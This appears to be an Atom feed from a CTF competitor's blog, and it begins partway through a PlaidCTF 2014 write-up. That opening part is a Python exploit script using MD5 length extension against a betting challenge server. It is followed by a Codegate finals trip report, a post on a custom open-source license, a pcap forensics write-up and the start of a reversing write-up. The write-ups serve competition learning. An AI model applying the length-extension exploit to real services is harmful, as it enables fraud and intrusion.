</span><span class='line'>    <span class="n">ret</span> <span class="o">=</span> <span class="n">s</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\x80</span><span class="s">&#39;</span>
</span><span class='line'>    <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">%</span> <span class="mi">64</span> <span class="o">!=</span> <span class="mi">56</span><span class="p">:</span>
</span><span class='line'>        <span class="n">ret</span> <span class="o">+=</span> <span class="s">&#39;</span><span class="se">\x00</span><span class="s">&#39;</span>
</span><span class='line'>    <span class="n">ret</span> <span class="o">+=</span> <span class="n">l32</span><span class="p">(</span><span class="n">tl</span><span class="p">)</span>
</span><span class='line'>    <span class="n">ret</span> <span class="o">+=</span> <span class="n">l32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">ret</span> <span class="o">+</span> <span class="n">a</span>
</span><span class='line'>
</span><span class='line'><span class="n">host</span> <span class="o">=</span> <span class="s">&#39;54.197.195.247&#39;</span>
</span><span class='line'><span class="n">port</span> <span class="o">=</span> <span class="mi">4321</span>
</span><span class='line'>
</span><span class='line'><span class="n">io</span> <span class="o">=</span> <span class="n">zio</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">),</span> <span class="n">print_write</span> <span class="o">=</span> <span class="n">COLORED</span><span class="p">(</span><span class="n">REPR</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;6) quit&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;and 100):&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s">&#39;100&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;6) quit&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s">&#39;3&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;nonce for this round&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">&#39;a</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;we generated &#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">remain1</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;,&#39;</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
</span><span class='line'><span class="n">remain1_str</span> <span class="o">=</span> <span class="s">&#39;0&#39;</span> <span class="o">*</span> <span class="mi">7</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">remain1</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s">&#39;L&#39;</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">remain1</span><span class="p">,</span> <span class="n">remain1_str</span>
</span><span class='line'>
</span><span class='line'><span class="n">ext</span> <span class="o">=</span> <span class="n">md5_ext</span><span class="p">(</span><span class="s">&#39;k&#39;</span> <span class="o">*</span> <span class="mi">16</span> <span class="o">+</span> <span class="s">&#39;a</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">,</span> <span class="s">&#39;b</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;6) quit&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s">&#39;3&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;nonce for this round&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">ext</span><span class="p">[</span><span class="mi">16</span><span class="p">:])</span>
</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;we generated &#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">remain2</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;,&#39;</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
</span><span class='line'><span class="n">remain2_str</span> <span class="o">=</span> <span class="s">&#39;0&#39;</span> <span class="o">*</span> <span class="mi">7</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">remain2</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s">&#39;L&#39;</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">remain2</span><span class="p">,</span> <span class="n">remain2_str</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="bp">False</span><span class="p">:</span>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;6) quit&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s">&#39;5&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;the nonce has been &#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">nonce</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
</span><span class='line'>    <span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">nonce</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s">&#39;L&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">log</span><span class="p">(</span><span class="s">&#39; &#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="s">&#39;./search&#39;</span><span class="p">,</span> <span class="n">remain1_str</span><span class="p">,</span> <span class="n">remain2_str</span><span class="p">]),</span> <span class="s">&#39;red&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">prefix</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">([</span><span class="s">&#39;./search&#39;</span><span class="p">,</span> <span class="n">remain1_str</span><span class="p">,</span> <span class="n">remain2_str</span><span class="p">])</span>
</span><span class='line'><span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">prefix</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span> <span class="o">==</span> <span class="mi">7</span>
</span><span class='line'>
</span><span class='line'><span class="n">first_md5</span> <span class="o">=</span> <span class="n">prefix</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span> <span class="o">+</span> <span class="n">remain1_str</span><span class="p">[</span><span class="mi">7</span><span class="p">:]</span>
</span><span class='line'>
</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;6) quit&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;between 1 and 100):&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">log</span><span class="p">(</span><span class="s">&#39; &#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="s">&#39;./even&#39;</span><span class="p">,</span> <span class="n">first_md5</span><span class="p">]),</span> <span class="s">&#39;red&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">candi</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">([</span><span class="s">&#39;./even&#39;</span><span class="p">,</span> <span class="n">first_md5</span><span class="p">])</span>
</span><span class='line'><span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">candi</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">splitlines</span><span class="p">():</span>
</span><span class='line'>    <span class="n">ary</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&#39;, &#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">c</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">ary</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">c</span> <span class="o">==</span> <span class="s">&#39;b&#39;</span><span class="p">:</span> <span class="k">continue</span>
</span><span class='line'>    <span class="n">ext</span> <span class="o">=</span> <span class="n">md5_ext</span><span class="p">(</span><span class="s">&#39;k&#39;</span> <span class="o">*</span> <span class="mi">16</span> <span class="o">+</span> <span class="s">&#39;a</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">,</span> <span class="n">c</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">log</span><span class="p">(</span><span class="s">&#39;hash expectation: </span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">ary</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s">&#39;red&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;6) quit&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s">&#39;2&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39; and &#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">balance</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;):&#39;</span><span class="p">)[:</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="n">balance</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;6) quit&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s">&#39;3&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;nonce for this round&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">ext</span><span class="p">[</span><span class="mi">16</span><span class="p">:])</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">rs</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;====&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="k">if</span> <span class="s">&#39;Too bad&#39;</span> <span class="ow">in</span> <span class="n">rs</span><span class="p">:</span>
</span><span class='line'>        <span class="k">break</span>
</span><span class='line'>    <span class="k">elif</span> <span class="s">&#39;key&#39;</span> <span class="ow">in</span> <span class="n">rs</span><span class="p">:</span>
</span><span class='line'>        <span class="k">break</span>
</span><span class='line'>
</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>Here is the command line output recorded by asciinema <a href="https://asciinema.org/a/8888">commandline output record</a></p>

<script type="text/javascript" src="https://asciinema.org/a/8888.js" id="asciicast-8888" async></script>


<p>Download source code here</p>

<ul>
<li><a href="http://blog.ztrix.me/downloads/code/plaidctf-2014-parlor-writeup/parlor.py">attack script parlor.py</a></li>
<li><a href="http://blog.ztrix.me/downloads/code/plaidctf-2014-parlor-writeup/search.cpp">search.cpp</a></li>
<li><a href="http://blog.ztrix.me/downloads/code/plaidctf-2014-parlor-writeup/even.cpp">even.cpp</a></li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Codegate CTF Final 2014 Memory]]></title>
    <link href="http://blog.ztrix.me/blog/2014/04/10/codegate-ctf-final-2014-memory/"/>
    <updated>2014-04-10T23:48:01+08:00</updated>
    <id>http://blog.ztrix.me/blog/2014/04/10/codegate-ctf-final-2014-memory</id>
    <content type="html"><![CDATA[<p>by Wenlei Zhu (zTrix@blue-lotus)</p>

<p>Last week, We represented team blue-lotus, consisting of me(zTrix), cbmixx, Aluex, Adrian, fqj and our beautiful photographer as well as translator, at Codegate CTF Finals 2014, in Seoul, South Korea. It&rsquo;s really a wonderful experience.</p>

<p>Since we are close to Seoul, we took off at April 1st, just one day before the game.</p>

<!-- more -->


<p>The good part of participating CTF offline final events in South Korea is, we are familiar with the culture, and only 1 hour time zone delta cause no jetlag at all. Besides, some of us took part in Secuinside Finals 2013, which was also in Seoul. So basically, things went very smoothly.</p>

<p>But still we have some problems, the biggest one was language. We knew nothing about Korean, and our translator as well as photographer, always told us to communicate by ourselves, unless necessary, she wouldn&rsquo;t help us. So we tried as hard as we could, using simple English words, gestures, even a little Japanese, and amazingly, Korean people could understand us!</p>

<p>The CTF game started at 2pm on April 2nd, and lasted 20 hours until 10 AM the next morning. All 14 teams (CLGT didn&rsquo;t manage to present) were in a large Hall room, with the organizers located at a corner.</p>

<p><img src="http://blog.ztrix.me/images/codegate-ctf-final-2014-memory/cg.jpg" alt="/images/codegate-ctf-final-2014-memory/cg.jpg" /></p>

<p>Most of the TOP CTF teams such as <a href="(http://ppp.cylab.cmu.edu/)">PPP</a>, <a href="http://mslc.ctf.su/">More Smoked Leet Chicken</a>, <a href="http://blog.dragonsector.pl">dragon sector</a> were in the competition. <a href="(http://ppp.cylab.cmu.edu/)">PPP</a> sent the most powerful members, including the famous <a href="http://geohot.com/">geohot</a>. So even before the game, we could bet on <a href="(http://ppp.cylab.cmu.edu/)">PPP</a>&rsquo;s winning of champion without hesitation.</p>

<p>A total of 15 problems were released one after another. Here are the problem list.</p>

<ul>
<li>RPG, web, 300</li>
<li>wsh, pwnable, 400</li>
<li>akkka, reversing, 300</li>
<li>running_danbi, mixed, 750</li>
<li>graynode, reversing, 800</li>
<li>TK, web, 200</li>
<li>pentester, logical + pwnable, 450</li>
<li>login page, web, 350</li>
<li>securepack, mixed, 350</li>
<li>trueman, web, 600</li>
<li>fortune teller, crypto + pwnable, 650</li>
<li>hexagrams, reversing, 600</li>
<li>virtual terminal, pwnable, 500</li>
<li>drupbox, pwnable, 400</li>
<li>webboard, web, 350</li>
</ul>


<p>So actually problems can be categoried into web (lots of SQL injection) and binary analysis (piggyback crypto, logical and pwnable elements).</p>

<p>From our point of view, the problems are hard and tricky, but not for <a href="(http://ppp.cylab.cmu.edu/)">PPP</a>. At 14:55, only less than one hour from the beginning, the organizer announced first blood from <a href="(http://ppp.cylab.cmu.edu/)">PPP</a>. After that, I can still remember they announced several first blood of <a href="(http://ppp.cylab.cmu.edu/)">PPP</a>, especially for graynode, the problem with the highest score. Actually only <a href="(http://ppp.cylab.cmu.edu/)">PPP</a> solved that problem thoughout the game. For us, we even didn&rsquo;t get any time on opening it.</p>

<p>We solved several web problems, and only one binary, the pentester, by me. The bug is a tricky logic error which could be called &ldquo;use before init&rdquo;. A buffer malloced from heap are created each time storing the password, but without initialization, which allow us to dump the admin password byte by byte. Although the problems are marked as &ldquo;Logical + Pwnable&rdquo;, it turned out there was nothing &ldquo;pwnable&rdquo; here, just exploiting the logic error was enough to score. I used my own crafted io library <a href="https://github.com/zTrix/zio">zio</a>, which was very handy, and I only took less than 10 minutes on writing exploitation code after identifying the bug.</p>

<p>Finally we ranked 8. We tried our best. And congratulations to <a href="(http://ppp.cylab.cmu.edu/)">PPP</a>, <a href="http://mslc.ctf.su/">MSLC</a>, <a href="http://blog.dragonsector.pl">Dragon Sector</a>, <a href="http://eindbazen.net/">eindbazen</a>, you guys really rocks!</p>

<p><img src="http://blog.ztrix.me/images/codegate-ctf-final-2014-memory/scoreboard.png" alt="/images/codegate-ctf-final-2014-memory/scoreboard.png" /></p>

<p>Note that <a href="(http://ppp.cylab.cmu.edu/)">PPP</a> got more scores than the sum of 2nd and 3rd place.</p>

<p>There was an interesting network session after the CTF. We met a lot of interesting people. We met some members from <a href="https://ctftime.org/team/1816">pwnies</a>, they were very friendly. And their <a href="https://github.com/pwnies/pwntools">pwntools</a> is one of our favorite tools. Thanks for such great tool! We talked with the awesome <a href="(http://ppp.cylab.cmu.edu/)">PPP</a> members, and got some clue on how they solved those hard problems. It&rsquo;s really great to meet those cool guys.</p>

<p>To conclude, I really appreciate this trip to South Korea participating such a great CTF. The problems were well prepared with very few defects, and the organizer provided network router, cable, switch, power socket, and even food. So we could focus on solving problems. Thank you for hosting. Looking forward to codegate CTFs in the future.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Let's Make License Social! The Star and Thank Author License (SATA License)]]></title>
    <link href="http://blog.ztrix.me/blog/2014/03/29/star-and-thank-author-license/"/>
    <updated>2014-03-29T20:01:36+08:00</updated>
    <id>http://blog.ztrix.me/blog/2014/03/29/star-and-thank-author-license</id>
    <content type="html"><![CDATA[<p>by Wenlei Zhu</p>

<p>There are many <a href="http://opensource.org/licenses">licenses</a> out there for open source software. <a href="http://opensource.org/licenses/gpl-license">GPL</a>, <a href="http://opensource.org/licenses/MIT">MIT License</a>, <a href="http://opensource.org/licenses/Apache-2.0">Apache License</a> are most popular ones among them.</p>

<p>When creating projects on <a href="http://github.com">github</a>/<a href="http://code.google.com">google code</a>, there even is an option for people to choose the most popular licenses.</p>

<p>But to me, those licenses are boring, and for most of the time, I think, nobody care about them, very few people can distinguish them. Actually, it&rsquo;s just put into a project occupying an embarrassing position, maybe just to make a project feels more like a formal one, and in active developing.</p>

<p>Why not make those licenses more interesting, and attach some social functions for developers?</p>

<!-- more -->


<p>I&rsquo;ve come up with an idea called, <a href="https://github.com/zTrix/star-and-thank-author-license">Star And Thank Author License</a>. The key points are</p>

<ul>
<li>People need to star/+1/Like the project which uses <a href="https://github.com/zTrix/star-and-thank-author-license">SATA License</a>.</li>
<li>People need to thank the authors of the project listed in the <a href="https://github.com/zTrix/star-and-thank-author-license">SATA License</a>.</li>
</ul>


<p>Here I am going to explain in details.</p>

<h2>How about forking a project with <a href="https://github.com/zTrix/star-and-thank-author-license">SATA License</a>?</h2>

<p>The <a href="https://github.com/zTrix/star-and-thank-author-license">SATA License</a> stated that</p>

<pre><code>Contributors of this project by forking have the option to add his/her name and 
forked project url at copyright and project url sections, but shall not delete 
or modify anything else in these two sections.
</code></pre>

<p>So, when someone used a project B which is forked from project A, he/she still needs to Star and Thank the original project A. For project B, if the author listed himself/herself in the <a href="https://github.com/zTrix/star-and-thank-author-license">SATA License</a>, then the users of project B also need to star and thank author of project B.</p>

<p>Things are the same if some other developers forked project B. First he need to star and thank the authors of project A and B, then he can list himself in.</p>

<p>Thus whatever point you access in the fork tree, you have to star and thank all the authors from the fork tree leaf up to the root of the tree.</p>

<h2>How to star/+1/like projects?</h2>

<p><a href="http://github.com">Github</a> are the most popular source code hosting and social coding platform, there is a <code>star</code> button at the top-right corner of project home page. For google code hosting, you can <code>+1</code> the project, and for others, there is always some <code>like</code> or <code>thumb up</code> system, just click them.</p>

<h2>How to thank project authors?</h2>

<p>I&rsquo;ve suggested a few in the license text, but not limited to those</p>

<ul>
<li>Email the authors a thank-you letter, and make friends with him/her/them.</li>
<li>Report bugs or issues.</li>
<li>Tell friends what a wonderful project this is.</li>
<li>And, sure, you can just express thanks in your mind without telling the world.</li>
</ul>


<p>Actually, the thank-author process can be done in any ways you think OK. Star and thank author are just designed to attach social interaction functions to licenses. When you email a thank-you letter, no matter long or short, you build up a connection with the author. That&rsquo;s why I think you should let the author know you are grateful. Social developing has unlimited power, without which, Linux will be impossible to be such a success.</p>

<h2>Which License is SATA License based on?</h2>

<p>The <a href="https://github.com/zTrix/star-and-thank-author-license">SATA License</a> is based on <a href="http://opensource.org/licenses/MIT">MIT License</a>. I only added several lines. You can also create your own customized <a href="https://github.com/zTrix/star-and-thank-author-license">SATA License</a> by sublicensing <a href="http://opensource.org/licenses/gpl-license">GPL</a>, or any others.</p>

<p>Remember the primary goal and key point of <a href="https://github.com/zTrix/star-and-thank-author-license">SATA License</a> is to make licenses social. Don&rsquo;t limit yourself in those unimportant details.</p>

<p>Enjoy social coding with <a href="https://github.com/zTrix/star-and-thank-author-license">SATA License</a>!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Codegate CTF 2014 Quals - Weirdshark Writeup]]></title>
    <link href="http://blog.ztrix.me/blog/2014/02/25/codegate-2014-weirdshark-writeup/"/>
    <updated>2014-02-25T01:51:55+08:00</updated>
    <id>http://blog.ztrix.me/blog/2014/02/25/codegate-2014-weirdshark-writeup</id>
    <content type="html"><![CDATA[<p>by Wenlei Zhu (zTrix@blue-lotus)</p>

<p>A pcap file is given here for analysis. check type using <code>file</code></p>

<pre><code># file weird_shark.pcap_f5f1e42dd398f18c43af89ba972b3ee7
weird_shark.pcap_f5f1e42dd398f18c43af89ba972b3ee7: pcap-ng capture file - version 1.0
</code></pre>

<p>Open the file using wireshark, but no luck, wireshark reports malformed file format and refuse to open it.</p>

<p>So we need to extract the packets inside manually.</p>

<!-- more -->


<p>Soon I got the file format document <a href="https://www.winpcap.org/ntar/draft/PCAP-DumpFileFormat.html">here</a>, the file format is really simple, it&rsquo;s organized in blocks, and according to my comprehension, each block contains a single network frame packet.</p>

<p>According to <code>general block structure</code> section in the pcap document, we can easily get the block type, length, and content.</p>

<p>And as for the packet, there are several levels of network protocol headers, a brief hex view shows that the network traffic are HTTP requests and responses, so the protocol stack should be IP + TCP + HTTP</p>

<pre><code>| 6 + 6 bytes MAC addr + 2 bytes (ethertype 08 00) | 20 bytes IP header | 20 bytes TCP header | HTTP Header + HTTP Body |
</code></pre>

<p>the hard thing here to do manually pcap parse is to assemble TCP packets into byte stream, which require a good understanding of TCP control sequence. But we can assume that the network condition is good, no packet loss or retranssmission happens, just assemble them one by one and see what happens.</p>

<p>use the following python code to extract all http content</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">os</span><span class="o">,</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">struct</span>
</span><span class='line'>
</span><span class='line'><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;weird_shark.pcap_f5f1e42dd398f18c43af89ba972b3ee7&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span><span class='line'><span class="n">total</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># skip the first two blocks, which seems broken, 0x80 and 0x9c are the block sizes respectively</span>
</span><span class='line'><span class="n">index</span> <span class="o">=</span> <span class="mh">0x80</span> <span class="o">+</span> <span class="mh">0x9c</span>
</span><span class='line'>
</span><span class='line'><span class="n">w</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;http-content.bin&#39;</span><span class="p">,</span> <span class="s">&#39;w&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">while</span> <span class="n">index</span> <span class="o">&lt;</span> <span class="n">total</span><span class="p">:</span>
</span><span class='line'>    <span class="n">block_type</span> <span class="o">=</span> <span class="n">f</span><span class="p">[</span><span class="n">index</span><span class="p">:</span><span class="n">index</span><span class="o">+</span><span class="mi">4</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&#39;hex&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">block_size</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">f</span><span class="p">[</span><span class="n">index</span><span class="o">+</span><span class="mi">4</span><span class="p">:</span><span class="n">index</span><span class="o">+</span><span class="mi">8</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>    <span class="n">captured_len</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">f</span><span class="p">[</span><span class="n">index</span><span class="o">+</span><span class="mi">20</span><span class="p">:</span><span class="n">index</span><span class="o">+</span><span class="mi">24</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>    <span class="n">packet_len</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">f</span><span class="p">[</span><span class="n">index</span><span class="o">+</span><span class="mi">24</span><span class="p">:</span><span class="n">index</span><span class="o">+</span><span class="mi">28</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>    <span class="k">print</span> <span class="n">index</span><span class="p">,</span> <span class="n">block_size</span><span class="p">,</span> <span class="n">packet_len</span><span class="p">,</span> <span class="n">captured_len</span><span class="p">,</span> <span class="n">block_type</span>
</span><span class='line'>    <span class="n">w</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">f</span><span class="p">[</span><span class="n">index</span><span class="o">+</span><span class="mi">28</span><span class="o">+</span><span class="mi">54</span><span class="p">:</span><span class="n">index</span><span class="o">+</span><span class="mi">28</span><span class="o">+</span><span class="n">packet_len</span><span class="p">])</span>
</span><span class='line'>    <span class="n">w</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
</span><span class='line'>    <span class="n">index</span> <span class="o">+=</span> <span class="n">block_size</span>
</span><span class='line'>
</span><span class='line'><span class="n">w</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>The result seems very promising,  just concat the packet contents one by one really works! which indicates the network condition is really good. There are several http requests inside</p>

<pre><code>GET / HTTP/1.1
GET /favicon.ico HTTP/1.1
GET /mario.png HTTP/1.1
GET /favicon.ico HTTP/1.1
GET /obama.bmp HTTP/1.1
GET /codegate.jpg HTTP/1.1
GET /multiple.pdf HTTP/1.1
GET /grayhash.jpg HTTP/1.1
</code></pre>

<p>And to my surprise, the flag is not in <code>codegate.jpg</code>, but in <code>multiple.pdf</code></p>

<p>FLAG = <code>FORENSICS_WITH_HAXORS</code></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[PHDays CTF IV Quals 2014 - Turututu Writeup]]></title>
    <link href="http://blog.ztrix.me/blog/2014/01/29/phdays-quals-2014-turututu/"/>
    <updated>2014-01-29T11:13:35+08:00</updated>
    <id>http://blog.ztrix.me/blog/2014/01/29/phdays-quals-2014-turututu</id>
    <content type="html"><![CDATA[<p>by Wenlei Zhu (zTrix@blue-lotus)</p>

<p>turututu is an ELF 64-bit executable, after some investigation, it&rsquo;s easy to find out that the task.exe is a native binary generated using <code>ocamlopt</code>.</p>

<p>I know little about <a href="http://en.wikipedia.org/wiki/OCaml">ocaml</a>, so at first I searched a lot trying to get some bytecode or decompiler stuff, or some dedicated debugger for <a href="http://en.wikipedia.org/wiki/OCaml">ocaml</a>, but none of these tools could be found.</p>

<p>So it&rsquo;s time to dive into assembly.</p>

<!-- more -->


<p>From the string constant <code>Sorry, waybe next time...</code>(typo here, LOL!) printed by task.exe, we xref to <code>0x402bf0</code>, and at <code>0x402dda</code>, it seems that some check function is called and then print <code>Gratz!</code> or <code>Sorry, waybe next time...</code>(LOL again!) according to its return value.</p>

